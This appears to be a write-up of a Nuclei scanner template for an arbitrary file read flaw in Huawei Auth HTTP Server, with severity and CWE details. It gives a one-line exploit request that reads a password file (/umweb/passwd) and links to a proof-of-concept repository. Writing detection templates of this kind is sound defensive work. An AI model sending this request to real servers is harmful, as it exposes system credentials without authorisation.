# Nuclei Template: Huawei Auth Http Server - Arbitrary File Read
**Template ID:** huawei-authhttp-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`huawei-authhttp-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Huawei Auth HTTP Server is vulnerable to Arbitrary File Read.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/umweb/passwd
```

## References
- https://mp.weixin.qq.com/s?__biz=MzIxMTg1ODAwNw==&mid=2247498499&idx=1&sn=6850c3e9a3df795e48ba9a10c9772ddd
- https://github.com/Vme18000yuan/FreePOC/blob/master/poc/pocsuite/huawei-auth-http-readfile.py
